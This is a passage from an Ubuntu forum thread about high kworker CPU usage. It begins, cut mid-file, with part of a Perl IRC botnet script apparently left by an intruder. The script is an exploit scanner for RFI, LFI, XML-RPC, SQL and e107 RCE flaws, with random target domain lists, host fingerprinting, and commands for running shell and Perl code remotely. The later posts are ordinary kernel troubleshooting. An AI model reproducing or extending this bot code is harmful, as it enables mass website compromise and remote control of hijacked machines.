my @dom      = ("*.com","*.net","*.org","*.edu","*.gov","*.eu","*.us","*.ru","*.pl","*.biz","*.tv","*.info","*.org","*.net","*.ae","*.ar","*.at","*.au","*.be","*.br","*.ca","*.ch","*.cl","*.de","*.dk","*.fi","*.fr","*.gr","*.hk","*.ie","*.il","*.it","*.jp","*.kr","*.lt","*.lv","*.nl","*.pa","*.pe","*.pl","*.pt","*.ru","*.sg","*.tr","*.tw","*.ua","*.uk","*.hu","*.af","*.ae","*.ag","*.ai","*.am","*.ar","*.as","*.at","*.au","*.az","*.ba","*.bd","*.be","*.bg","*.bh","*.bi","*.bn","*.bo","*.bn","*.bs","*.bw","*.by","*.bz","*.ca","*.cd","*.cg","*.ch","*.ci","*.ck","*.cl","*.cn","*.co","*.cr","*.cu","*.cz","*.de","*.dj","*.dk","*.dm","*.do","*.ec","*.ee","*.eg","*.es","*.et","*.fi","*.fj","*.fm","*.fr","*.ge","*.gg","*.gi","*.gl","*.gm","*.gp","*.gr","*.gt","*.gy","*.hk","*.hn","*.hr","*.ht","*.hu","*.id","*.ie","*.il","*.im","*.in","*.is","*.it","*.je","*.jm","*.jo","*.jp","*.ke","*.kh","*.ki","*.kg","*.kr","*.kz","*.la","*.li","*.lk","*.ls","*.lt","*.lu","*.lv","*.ly","*.ma","*.md","*.mn","*.ms","*.mt","*.mu","*.mv","*.mw","*.mx","*.my","*.na","*.nf","*.ng","*.ni","*.nl","*.no","*.np","*.nr","*.nu","*.nz","*.om","*.pa","*.pe","*.ph","*.pk","*.pl","*.pn","*.pr","*.pt","*.py","*.qa","*.ro","*.ru","*.rw","*.sa","*.sb","*.sc","*.se","*.sg","*.sh","*.si","*.sk","*.sn","*.sm","*.st","*.sv","*.th","*.tj","*.tk","*.tm","*.to","*.tp","*.tr","*.tt","*.tw","*.ua","*.ug","*.uk","*.uy","*.uz","*.vc","*.ve","*.vg","*.vi","*.vn","*.vu","*.ws","*.yu","*.za","*.zm","*.zw");
my @thS      = ("2000","2001","2002","2003","2004","2005","2006","2007","2008","2009","2010","1999","1998","1997","1996","1995");
my @dorkzcr  = ("username","password","member","login","admin","comment","email");
my @autodoms = (
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))],
        $dom[rand(scalar(@dom))]
        );
    return @autodoms;
}

##[ ENCODE/DECODE ]##
sub htmltourl { my $str = $_[0]; $str =~ s/&amp;/&/g; return $str; }
sub links() {
    my @l;
    my $link = $_[0];
    my $host = $_[0];
    my $hdir = $_[0];
    $hdir =~ s/(.*)\/[^\/]*$/\1/;
    $host =~ s/([-a-zA-Z0-9\.]+)\/.*/$1/;
    $host .= "/";
    $link .= "/";
    $hdir .= "/";
    $host =~ s/\/\//\//g;
    $hdir =~ s/\/\//\//g;
    $link =~ s/\/\//\//g;
    push( @l, $link, $host, $hdir );
    return @l;
}
sub urlen {
  my $str = $_[0];
  #$str =~ s/\+/\%2B/g;
  $str =~ s/ /\+/g;
  $str =~ s/@/\%40/g;
  $str =~ s/\//\%2F/g;
  $str =~ s/&/\%26/g;
  $str =~ s/\"/\%22/g;
  $str =~ s/,/\%2C/g;
  $str =~ s/\\/\%5C/g;
  $str =~ s/:/\%3A/g;
  $str =~ s/\[/\%5B/g;
  $str =~ s/\]/\%5D/g;
  $str =~ s/\?/\%3F/g;
  $str =~ s/\=/\%3D/g;
  $str =~ s/\|/\%7C/g;
  return $str;
}
sub urlde {
  my $str = $_[0];
  $str =~ s/\+/ /g;
  $str =~ s/\%2B/\+/g;
  $str =~ s/\%40/@/g;
  $str =~ s/\%2E/\./g;
  $str =~ s/\%2F/\//g;
  $str =~ s/\%26/&/g;
  $str =~ s/\%22/\"/g;
  $str =~ s/\%2C/,/g;
  $str =~ s/\%5C/\\/g;
  $str =~ s/\%3A/:/g;
  $str =~ s/\%5[B|b]/\[/g;
  $str =~ s/\%5[D|d]/\]/g;
  $str =~ s/\%3F/\?/g;
  $str =~ s/\%3D/\=/g;
  $str =~ s/\%7C/\|/g;
  return $str;
}
sub cryptz { return crypt($_[0],"Origins"); }

##[ TRIMMER CRLF ]##
sub trimrn {
  my $str = $_[0];
  if (!$str) { return ""; }
  $str =~ s/\r// if ($str);
  $str =~ s/\n//;
  return $str;
}

##[ INFO BOT ]##
sub bot_info   {
  my $chan   = $_[0];
  my $hlogo  = " [".$colz{14}."!".$colz{1}."] ".$colz{14};
  my $uname  = `uname -a`;
  my $uid    = `id`;
  my $uptime = `uptime`;
  my @info   = (
  $hlogo."Crack RFI & LFI & XML & SQL Scanner $versi Info ",
  $hlogo."Written under ActivePerl 0.0 Build 1x by Xcode [Crack Crew] ",
  $hlogo."Uname: $colz{6} $uname ",
  $hlogo."Uid: .$colz{6} $uid ",
  $hlogo."Uptime: .$colz{6} $uptime ",
  );
  foreach my $m(@info) { irc_msg($chan,$m); }
}

##[ HELP BOT ]##
sub bot_help {
  my ($chan,$level) = @_;
  my $hsepz = "[".$colz{14}."!".$colz{1}."] ".$colz{14};
  my $hlogo = "[".$colz{14}."!".$colz{1}."] ".$colz{6}.$cmdpre.$colz{14};
  my $hcspr = "[".$colz{14}."!".$colz{1}."] ".$colz{6}.$bot{nick}.$colz{14}." ";
  my @help; my $i;
  my @hlp1 = (
  $hsepz."Crack RFI & LFI & XML & SQL Scanner $versi Help",
  $hlogo."scan|scan2 <bug> <dork> &#65533; Memulai scanner | scanner & Eksploit RFI & LFI & XML & SQL",
  $hcspr."scan <bug> <dork> &#65533; Memulai scanner & Eksploit RFI & LFI",
  $hcspr."xml <bug> <dork> &#65533; Memulai scanner & Eksploit XML",
  $hcspr."e107 <bug> <dork> &#65533; Memulai scanner & Eksploit e107 RCE",
  $hcspr."sql <bug> <dork> &#65533; Memulai scanner & Eksploit SQL",
  $hcspr."sqli -h &#65533; Melihat bantuan scemafuze SQL",
  $hlogo."milw0rm <keywords> &#65533; Mencari daftar bug di milw0rm",
  $hlogo."cmdlfi <LFI target> <comand> &#65533; execute target LFI",
  $hlogo."cmdrfi <RFI target> <comand> &#65533; execute target RFI",
  $hlogo."cmdxml <XML target> <comand> &#65533; execute target XML",
  $hlogo."cmde107 <XML target> <comand> &#65533; execute target e107 RCE",
  $hlogo."ip <ip> &#65533; cek ip",
  $hlogo."zip <zip> &#65533; cek zip/post code",
  $hlogo."text[enc/dec] <text> &#65533; encrypt/decrypt text",
  $hlogo."respon &#65533; Cek Respon & Injector RFI & User Agent LFI",
  $hlogo."urlen|urlde <teks> &#65533; Encoder/Decoder URL",
  $hlogo."cek <target> &#65533; Cek RFI & LFI & XML & SQL target",
  $hlogo."info &#65533; Informasi bot",
  $hlogo."auth <password> &#65533; Login ke bot",
  );
  my @hlp2 = (
  $hsepz."User Commands: ",
  $hlogo."joomla <bug> <dork> &#65533; Memulai scanner & Eksploit RFI & LFI & XML & SQL Joomla",
  $hlogo."hitung <jumlah> &#65533; Mengganti hitungan proses eksploitasi",
  $hlogo."cryptz <password> &#65533; Membuat password yg terenkripsi",
  $hlogo."join|part <channel> &#65533; Join/Part channel",
  $hlogo."nick <nick> &#65533; Ganti nick bot",
  $hlogo."logout &#65533; Logout dari bot",
  );
  my @hlp3 = (
  $hsepz."Admin Commands:",
  $hlogo."crespon[1/2]|cshell|cspread <url> &#65533; Mengganti respon/injector/spread/spread2 RFI",
  $hlogo."cshurl <url> &#65533; Mengganti injector (Ckrid1.txt,Ckrid2.txt,Origins.txt,Origins2.txt) RFI",
  $hlogo."rfipid <perintah> &#65533; Mengganti RFI & LFI & XML & SQL PID",
  $hlogo."spy &#65533; Menampilkan konfigurasi Spy",
  $hlogo."spyhost <your chan> &#65533; Channel host buat spy",
  $hlogo."spychan <chan> &#65533; Channel yang akan di spy",
  $hlogo."spyword <regex> &#65533; Kata yg di akan spy",
  $hlogo."raw <perintah> &#65533; Perintah Raw IRC",
  $hlogo."cmd <perintah shell> &#65533; Mengeksekusi perintah di shell",
  $hlogo."eval <kode perl> &#65533; Mengeksekusi kode perl",
  $hlogo."quit &#65533; Quit dari IRC",
  $hlogo."keluar &#65533; Quit dari IRC & Matikan semua proses Perl",
  );
  if    ( $level == 1 ) { push(@help,@hlp1); }
  elsif ( $level == 2 ) { push(@help,@hlp2); }
  elsif ( $level == 3 ) { push(@help,@hlp3); }
  foreach my $m (@help) { irc_msg($chan,$m); $i++; if ( $i % $conf{linez} == 0 ) { sleep($conf{sleepz}); } }
}

##[ CUSTOM MESSAGE ]##
sub msge { my ($chan,$se,$res)        = @_; irc_msg($chan," ".$se." ".$res." "); }
sub msgi { my ($chan,$judul,$info)    = @_; irc_msg($chan," [$judul] $info "); }
sub msgn { my ($chan,$se,$nxurl)    = @_; irc_msg($chan," ".$se." ".$nxurl." "); }
sub msgr { my ($chan,$se,$totr,$clr)    = @_; irc_msg($chan," ".$se." ".$totr." ".$clr." "); }
sub msgt { my ($chan,$se,$res)        = @_; irc_msg($chan," ".$se." ".$res." "); }
sub ntci { my ($chan,$judul,$info)    = @_; irc_ntc($chan," [$judul] $info "); }

##[ PERINTAH RAW IRC ]##
sub irc_raw  { my $data        = $_[0]; print $sock "$data\r\n"; }
sub irc_pasv { my $pasv        = $_[0]; irc_raw("PASS $pasv"); }
sub irc_nick { my $nick        = $_[0]; irc_raw("NICK $nick"); }
sub irc_user { my $ident    = $_[0]; irc_raw("USER $ident localhost * : $versi"); }
sub irc_msg  { my ($to,$psn)    = @_; irc_raw("PRIVMSG $to :$psn"); }
sub irc_act  { my ($to,$psn)    = @_; irc_raw("PRIVMSG $to :ACTION $psn"); }
sub irc_ntc  { my ($to,$psn)    = @_; irc_raw("NOTICE $to :$psn"); }
sub irc_join { my $to        = $_[0]; irc_raw("JOIN $to"); }
sub irc_part { my $to        = $_[0]; irc_raw("PART $to"); }
sub irc_quit { my $psn        = $_[0]; irc_raw("QUIT :$psn"); exit; }

##############################
##[ Origins CRACKED CREW ]##
##############################

```

---

### Post by CryNGRoad on 2011-06-25
Like some of you, I was researching kworker and this thread came up. Here's my 10 cents:

> **perdlo said:**
> ...
I got the message "**Your Desktop Is being controlled by another user**" (same one you get when your VNC'ing into your machine.

A terminal window opened and did a wget of a file called **src.txt**!!!! (perl script - virus/malware).

I pulled network cable from my pc and rebooted.
...

This doesn't have anything to do with kworker**. **Sounds like  you  gave VNC / Remote Desktop access to the wrong person. If someone is   connecting and running terminal commands, I would suggest you disable   Remote Desktop.
Again**, This doesn't have anything to do with kworker**, other than you may now be running software that is doing "*work"* of a questionable nature.

Here's what my pal the Internet* told me:
kworker processes are "kernel worker threads". They are a normal part of the kernel operations, *assuming that the processes requesting the work are sane*.   (i.e. if you allow a bad person vnc access and they download and   execute bad programs, those programs could very well be requesting work   from the kernel and you would therefore see an increase in kworker  activity.

**excerpt from [*workqueue.txt*]("http://www.kernel.org/doc/Documentation/workqueue.txt") in the package *linux-doc***:
> Special purpose threads, called worker threads, execute the functions
off of the queue, one after the other.  If no work is queued, the
worker threads become idle.  These worker threads are managed in so
called thread-pools.So programs tell the kernel they need some stuff done, it queues it, then kworkers do it.

> **perdlo said:**
> ...kworker processes (about 8 of them). I couldn't kill them manually.
...

I have 8 to 10 kworkers on my system, each with  numbers after them, which I'm guessing indicates what thread-pool they  are part of.
You do not want to be killing off kworkers. They could  be doing something important, like syncing your precious data on Ubuntu  One.

Summary:
kworker is part of the kernel. If it's using too much cpu it's because  other running processes have asked the kernel to do  some work.

[SIZE=1]*The Internet is not actually your friend, let alone to be trusted. Please apply critical thinking when interpreting something the Internet tells you.[/SIZE]

---

### Post by vontroba on 2011-07-05
I have a Lenovo T61 and in my case the problem was broken ethernet port. This caused 50-60% of the CPU to be used in about every 5 seconds, so I started using USB network adapter and disabled built-in one. Instructions can be found here: [http://wiki.debian.org/KernelModuleBlacklisting](http://wiki.debian.org/KernelModuleBlacklisting)

I know it's a very specific case, but hopefully next person with the same problem will stumble on this thread and save a day of googelling ;)

---

### Post by DragonM15 on 2011-07-21
Since I know this isnt strictly an ubuntu issue, ill throw this in here. I am running the latest testing kernel straight from kernel.org (3.0.0-rc7), and it still has this kworker issue. Hopefully it will be fixed soon!

DragonM15

---

### Post by alquery on 2011-09-17
These kworkers were invading all my memory space after upgrading from 10.10 to 11.04; I think it was because of a kernel upgrade. I started using an earlier kernel (2.6.35 instead of 2.6.38) and the problem disappeared. I hope this gets fixed soon in later kernels so I don't have to stay with this older one.

---

### Post by Flywaver on 2011-10-14
running 11.10 release AMD64 Desktop and I just found those pesky kworker :(

---

### Post by chicharras on 2011-10-26
> **vontroba said:**
> I have a Lenovo T61 and in my case the problem was broken ethernet port. This caused 50-60% of the CPU to be used in about every 5 seconds, so I started using USB network adapter and disabled built-in one. Instructions can be found here: [http://wiki.debian.org/KernelModuleBlacklisting](http://wiki.debian.org/KernelModuleBlacklisting)

I know it's a very specific case, but hopefully next person with the same problem will stumble on this thread and save a day of googelling ;)

The exact same thing is happening to me, so thank you very much for documenting your case here. Very helpful!
Regards.

---

### Post by jaygo on 2011-10-31
in my case, the kworker threads were maxing out my core 2 duo and causing mouse, audio, system, and app lag. I've seen similar but less severe situations when an app had a lot of disk I/O. The issue persisted even after closing my bittorrent & backup apps. 

Finally, I noticed my system was using 320MB of swap (even though I had 4+ GB of free RAM). I did ```
sudo swapoff -a
``` and after a minute of the system flushing the swap out, my CPU usage dropped to nearly idle, and my RAM usage dropped as well.

This was happening an hour ago and rendering the machine nearly unusable, so I rebooted ... and had the same issue immediately. My best guess is that it was related to the swap usage, and that is likely related to some recent update, kernel or otherwise. For now, my workaround will be keeping swap off, or lowering swappiness.

ubuntu 11.04
kernel 2.6.38-12-generic-pae

---

### Post by alfonso78 on 2011-11-01
according to this thread [https://lkml.org/lkml/2011/3/30/836](https://lkml.org/lkml/2011/3/30/836) there is no single cause for kworker issues.

> one of the problems with that behavior is that it's actually fairly hard to figure out what the hell is happening. You don't see some nice thread description in 'top' any more (like you used to when everybody created their own threads and didn't do the common worker thread thing)

in the same thread and also in this: [https://lkml.org/lkml/2011/3/31/68](https://lkml.org/lkml/2011/3/31/68) there are a few suggestions on how to get more information.

to install perf: sudo apt-get install linux-tools

in my case, it was the encryption to use kworkers

---

### Post by DouglasAWh on 2011-11-15
> **jaygo said:**
> ```
sudo swapoff -a
```

I tried this. computer told me it could not allocate memory. :(

---

### Post by temporizer on 2011-12-07
is everyone still having this problem?
yesterday i had my mouse quit working and my audio as well.
And it seems that my computer stopped responding after waking from suspend.

```
temporizer@temporizer:~$ ps -A | grep kworker
 2648 ?        00:00:01 kworker/u:32
 2666 ?        00:00:01 kworker/u:50
 2698 ?        00:00:04 kworker/3:1
 3872 ?        00:00:02 kworker/1:2
 4086 ?        00:00:00 kworker/u:0
 4197 ?        00:00:01 kworker/2:1
 4319 ?        00:00:00 kworker/1:0
 4320 ?        00:00:00 kworker/3:0
 4324 ?        00:00:00 kworker/0:0
 4540 ?        00:00:00 kworker/0:2
 4543 ?        00:00:00 kworker/2:0
 4659 ?        00:00:00 kworker/0:1
 4664 ?        00:00:00 kworker/2:2
temporizer@temporizer:~$ uname -a
Linux temporizer 2.6.38-13-generic #52-Ubuntu SMP Tue Nov 8 16:53:51 UTC 2011 x86_64 x86_64 x86_64 GNU/Linux

```

i have 13 running kworker currently. I didn't check it yesterday when it happened (didn't know what to look for then.)

I ran 
```

sudo find / -name src.txt

```
and it came up with 0 results.
as you can see i'm using 2.6.38.13 and still having the issue.

if there is anything i can do to help the debug process, please let me know.

p.s. i am running on a toshiba p745-s4320. intel i5 processor with 6gb ram.

---

### Post by jaygo on 2011-12-21
yes, I think disabling swap was a lucky fix in my case. The real issue was a runaway process or two, hiding behind the kworker thread. 

Kworker threads tend to spike whenever there's steady disk activity, most likely relating to encryption.

---

### Post by kalkems on 2012-02-26
So has anyone seen a solution to this problem! I am running 11.10 and also notice kworker at work.

```
-00:~$ ps -A | grep kworker
   12 ?        00:00:00 kworker/2:0
   15 ?        00:00:00 kworker/3:0
  172 ?        00:00:00 kworker/3:1
  173 ?        00:00:00 kworker/2:1
  211 ?        00:00:00 kworker/u:5
  212 ?        00:00:00 kworker/u:6
 2838 ?        00:00:00 kworker/1:0
 2880 ?        00:00:01 kworker/0:1
 2908 ?        00:00:00 kworker/1:2
 2993 ?        00:00:00 kworker/0:2
 3006 ?        00:00:00 kworker/1:1
 3007 ?        00:00:00 kworker/0:0

```

/ernie

---

### Post by vasa1 on 2012-02-26
> **kalkems said:**
> So has anyone seen a solution to this problem! I am running 11.10 and also notice kworker at work.

ps -A | grep kworker
    4 ?        00:00:00 kworker/0:0...

/ernie
Hi, if you use the [code] tags (the button with the # sign) the stuff starting with "ps -A|grep kworker" will be formatted better.

---

### Post by kalkems on 2012-02-26
Thanx! Adjusted the above with code tag - does look better.
/ernie

---

